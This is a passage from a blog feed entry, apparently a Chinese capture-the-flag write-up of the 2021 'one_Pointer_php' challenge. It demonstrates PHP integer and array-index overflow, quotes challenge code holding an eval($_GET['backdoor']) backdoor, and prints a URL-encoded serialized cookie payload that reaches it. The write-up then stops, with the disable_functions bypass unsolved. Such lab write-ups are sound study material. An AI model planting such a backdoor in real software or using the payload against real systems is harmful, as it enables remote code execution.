class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MAX：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MAX);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_MIN：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_MIN);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP_INT_SIZE：&quot;</span>;</span><br><span class="line">var_dump(PHP_INT_SIZE);</span><br><span class="line"></span><br><span class="line">$a =<span class="number">9223372036854775806</span>;</span><br><span class="line">$b =<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line">$a++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_int：&quot;</span>;</span><br><span class="line">var_dump(is_int($a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="keyword">echo</span> <span class="string">&quot;is_float：&quot;</span>;</span><br><span class="line">var_dump(is_float($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line">$b++;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">输出：</span><br><span class="line">PHP_INT_MAX：int(9223372036854775807)</span><br><span class="line">PHP_INT_MIN：int(-9223372036854775808)</span><br><span class="line">PHP_INT_SIZE：int(8)</span><br><span class="line">bool(true)</span><br><span class="line">bool(true)</span><br><span class="line">is_int：bool(false)</span><br><span class="line">is_float：bool(true)</span><br><span class="line">9223372036854775806</span><br><span class="line">9223372036854775807</span><br><span class="line">9.2233720368548E+18</span><br></pre></td></tr></table></figure><p>同样会转化为float而不再属于整型，并会以科学计数法输出</p><p>这里的“int”，是<strong>有符号64位二进制可表示的最大数</strong>，或者说，我们更加熟悉的<strong>long long int</strong>。</p><blockquote><p><strong>2^63-1</strong>=<strong>9223372036854775807</strong></p></blockquote><p>较新的版本大概是提高了索引溢出的阈值……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$a[<span class="number">9223372036854775806</span>]=<span class="string">&quot;haha&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">$a[] =<span class="number">1</span>;</span><br><span class="line">var_dump($a);</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165907924.png" alt="image-20210513165907924"></p><p>最后的语句成功报错，根据这个方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>($user=unserialize($_COOKIE[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">$count[++$user-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>($count[]=<span class="number">1</span>)&#123;</span><br><span class="line">$user-&gt;count+=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>($_GET[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$user=<span class="keyword">new</span> User;</span><br><span class="line">$user-&gt;count=<span class="number">1</span>;</span><br><span class="line">setcookie(<span class="string">&quot;data&quot;</span>,serialize($user));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a =<span class="keyword">new</span> User();</span><br><span class="line">$a -&gt;count=<span class="number">9223372036854775806</span>;</span><br><span class="line"></span><br><span class="line">$a =urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>就可以成功绕过赋值判断</p><blockquote><p>O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D</p></blockquote><p>执行命令，来phpinfo看看敏感信息：</p><p><img src="/images/%E8%93%9D%E5%B8%BD%E6%9D%AF2021%E5%A4%8D%E7%8E%B0/image-20210513165922744.png" alt="image-20210513165922744"></p><p>……上一个绕过<strong>disable_function</strong>的还是so劫持或者蚁剑插件……不是很会……</p><p>看了dalao的wp，一直搞不好……原理倒是看了七七八八……</p><p>然后……没有然后了……蹲一个好大佬的wp😢</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;蓝帽杯2021复现&quot;&gt;蓝帽杯2021复现&lt;/span&gt;&lt;/h3&gt;&lt;h4&gt;&lt;span id=&quot;one_pointer_php&quot;&gt;one_Pointer_php&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;buu上开了环境，真不错&lt;/p&gt;
&lt;p&gt;user.php&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
</feed>
